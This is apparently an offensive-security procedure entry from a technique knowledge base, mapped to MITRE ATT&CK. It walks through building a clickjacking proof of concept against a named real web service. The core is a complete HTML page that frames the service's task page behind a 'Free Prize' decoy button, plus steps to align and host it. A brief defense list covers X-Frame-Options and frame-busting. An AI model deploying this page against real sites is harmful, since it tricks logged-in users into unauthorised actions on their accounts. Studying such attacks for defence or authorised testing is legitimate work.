---
id: proc-demonstrate-clickjacking-poc
name: Demonstrate Clickjacking with Proof-of-Concept
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:04.943Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploitation for Client Execution]]'
sub_techniques: []
tags:
  - clickjacking
  - poc
  - ui-redressing
  - web
commands: []
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploitation for Client Execution]]'
---

# Demonstrate Clickjacking with Proof-of-Concept

## Summary

This procedure creates and tests a proof-of-concept HTML page to demonstrate clickjacking by embedding a vulnerable site like Localize in an invisible iframe, tricking users into unintended actions such as adding tasks. It is used to validate and showcase UI redressing exploits.

## Description

Clickjacking involves overlaying transparent or hidden elements on a legitimate site to capture clicks. Targeting sites without X-Frame-Options, this procedure builds a malicious page that loads the target's task-addition interface in an iframe, aligned behind a decoy button. Prerequisites: Confirmed vulnerable site from prior reconnaissance. Expected outcomes: Successful simulation of unauthorized actions without user awareness.

## Requirements

1. Text editor to create HTML file
2. Web server to host the PoC (local or remote)
3. Victim access to the target site while logged in
4. Knowledge of target page elements (e.g., add-task button coordinates)

## Defense

Defensive measures and detection strategies:

- Enforce X-Frame-Options header on all responses
- Educate users on phishing and unexpected prompts
- Implement JavaScript frame-busting code
- Log and alert on unusual iframe usage

## Objectives

1. Embed target content in a controlled iframe without errors
2. Trick interactions to perform unauthorized actions
3. Validate impact like task manipulation on Localize

## Instructions

### Step 1: Create the PoC HTML File

**Context**: Build an HTML page with an invisible iframe loading the target and an overlay decoy.

**Instructions**: Save the following as bug_-_Copy.html:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Free Prize! Click to Claim</title>
  <style>
    iframe { position: absolute; top: 0; left: 0; opacity: 0.5; width: 100%; height: 100%; border: none; }
    .decoy { position: absolute; top: 200px; left: 200px; z-index: 1; }
  </style>
</head>
<body>
  <iframe src="https://localizejs.com/tasks"></iframe>
  <button class="decoy">Click to Add Exciting Task!</button>
</body>
</html>
```

Adjust iframe src to vulnerable page and decoy position to align with target button.

### Step 2: Host and Test the PoC

**Context**: Serve the file and simulate victim interaction.

**Instructions**: Host locally (e.g., python -m http.server 8000) or upload to a server. Open in browser while logged into Localize, click decoy, and verify action (e.g., task added).

**Expected Output**: Target action executes invisibly; no framing blocks.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]
- [[Exploitation for Client Execution]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[web]]
